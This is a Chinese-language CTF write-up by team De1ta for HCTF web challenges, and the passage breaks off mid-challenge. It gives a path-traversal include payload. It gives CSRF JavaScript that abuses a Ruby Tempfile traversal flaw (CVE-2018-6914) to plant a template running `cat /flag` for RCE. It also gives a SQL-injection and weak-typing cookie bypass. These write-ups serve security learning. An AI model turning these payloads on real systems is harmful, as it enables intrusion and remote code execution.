> Team: De1ta
首先感谢杭电的师傅们为我们带来了一场精彩的CTF比赛，出题和运维的大佬们都辛苦了！
顺便打个小广告：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc.
选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=
[TOC]
# Web
## warmup
参考：  
在source.php可以看到源码  
要使emmm::checkFile($_REQUEST['file'])返回true，利用?截取hint.php，利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag。  
payload: hint.php?/../../../../../../../../../../../ffffllllaaaagggg  
payload还可以：index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg一个道理
> hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}
## share
打开题目，主页翻译一下可以得到这些信息
是个让用户分享应用的网站，并且管理员可以把应用推给某个用户
/Alphatest可以看到一个filenumber 和自己的uid
/share
可以分享东西给管理员，猜测存在xss，context框传了个段xss代码，发现能接收到admin的请求，bot是PhantomJS/2.1.1，说明能执行js，但是开了httponly打不到cookie，猜测是要CSRF，url框传的东西好像没啥用
根据主页提示可能有源码泄漏，在robots.txt 看到了三个接口的代码
    /* this terrible code */
    class FileController  [:upload , :share_people_test]
    # post /file/upload
      def upload
        if(params[:file][:myfile] != nil && params[:file][:myfile] != "")
          file = params[:file][:myfile]
          name = Base64.decode64(file.original_filename)
          ext = name.split('.')[-1]
          if ext == name || ext ==nil
            ext=""
          end
          share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public/upload")
          share.write(Base64.decode64(file.read))
          share.close
          File.rename(share.path,share.path+"."+ext)
          tmp = Sharefile.new
          tmp.public = 0
          tmp.path = share.path
          tmp.name = name
          tmp.tempname= share.path.split('/')[-1]+"."+ext
          tmp.context = params[:file][:context]
          tmp.save
        end
        redirect_to root_path
      end
    # post /file/Alpha_test
      def Alpha_test
        if(params[:fid] != "" && params[:uid] != "" && params[:fid] != nil && params[:uid] != nil)
          fid = params[:fid].to_i
          uid = params[:uid].to_i
          if(fid > 0 && uid > 0)
            if(Sharelist.find_by(sharefile_id: fid)==nil)
              if(Sharelist.count("user_id = ?", uid.to_s) `  
参考  
尝试跨目录包含文件失败，应该是只能包含home目录下的文件
hint3给了ruby版本2.5.0  
通过查找ruby版本号，结合robots代码，主页代码和目录结构，可以确定要利用的是这个CVE：  
CVE-2018-6914: Unintentional file and directory creation with directory
traversal in tempfile and tmpdir  
大概意思就是在Tempfile 创建文件时如果传入(../)就能创建任意目录或文件  
想到可以传个文件到home下，结合主页的文件包含，即可RCE
整个思路就很清晰了：
  1. CSRF 让admin调用/file/upload 接口上传带有恶意文件名的文件
  2. Tmpfile漏洞使得文件生成在/views/home/目录下，但是新生成的文件名有部分是随机的
  3. CSRF 调用/file/Alpha_test 接口把文件分配到自己的id下，在/Alphatest拿到生成的文件名
  4. 主页文件包含，RCE
于是开始了艰难的构造payload  
最后上传的payload如下：
    function upload(i) {
    var test=$('meta').eq(1).attr("content");
    var url="/file/upload";
      var data="-----------------------------13025814701038468772945051835\x0d\x0a\
    Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\
    Content-Type: application/text\x0d\x0a\
    \x0d\x0a\
    PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\
    -----------------------------13025814701038468772945051835\x0d\x0a\
    Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\
    \x0d\x0a\
    de1ta\x0d\x0a\
    -----------------------------13025814701038468772945051835\x0d\x0a\
    Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\
    \x0d\x0a\
    "+test+"\x0d\x0a\
    -----------------------------13025814701038468772945051835\x0d\x0a\
    Content-Disposition: form-data; name=\"commit\"\x0d\x0a\
    \x0d\x0a\
    submit\x0d\x0a\
    -----------------------------13025814701038468772945051835\x0d\x0a\
    Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\
    \x0d\x0a\
    ✓\x0d\x0a\
    -----------------------------13025814701038468772945051835--";
      $.ajax({
       url: url,
       type:"POST",
       headers: {
           "Content-Type": "multipart/form-data; boundary=---------------------------13025814701038468772945051835",
           "Upgrade-Insecure-Requests":"1"
       },
       data:data,
       contentType:false,
       success:function(res){
       },
       error:function(err){
       }
      })
     }
     for(var i=1;i
文件内容为
文件名为
    ../../app/views/home/de1taxishir.erbss.erb
推送文件到我的uid下的代码为：
    function go(fffid){
      var test=$('meta').eq(1).attr("content");
      console.log(test);
      var params = {utf8:"\xE2\x9C\x93",authenticity_token:test,uid:2,fid:fffid,commit:"submit"};
      var url = '/file/Alpha_test';
    $.ajax({
       url : url,
       type : "POST",
       data : params,
       success : function(result) {
       },
       error:function(result){
       }
     })
    }
    for(var i=1;i
这里因为不知道文件id是多少，只能根据前面的filenumber来爆破一下，所以写了个for循环  
最后上传上去并获取文件名后，在主页进行文件包含执行命令，读取flag
ps：这道题有个搅shi bug，利用推文件给用户接口，无限暴力推fid到自己的uid下，就能看到别人上传的文件，并且别人就不知道他的文件名是啥了
还有就是js构造一个文件上传太坑了，一开始用new
File，一直失败，后面发现是PhantomJS不支持这个h5的类好像，于是硬生生写了个multipart/form-data 出来
> flag:hctf{8f4c57063ddb7b106e03e25f7d1bb813}
## kzone
打开发现是一个QQ钓鱼站，主页会跳转到空间  
 可以下载到源码  
install.sql 文件中有admin密码，admn。  
INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`)
VALUES  
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '小杰', '1503816935', 1);  
不过登陆不上去，密码被改了
审计源码翻到了member.php，发现这边没有addslashes，并且无需登录也可访问
可以看到这段代码从cookie获取了登陆信息，如果符合几个if，就能登陆  
想到通过注入 ，union select 替换掉admin_user和admin_pass  
尝试构造弱类型绕过：  
Cookie: PHPSESSID=s33h9c1u8bq5t0r8s4dura0c76; islogin=1;
login_data={"admin_user":"admin'||'1","admin_pass":65}  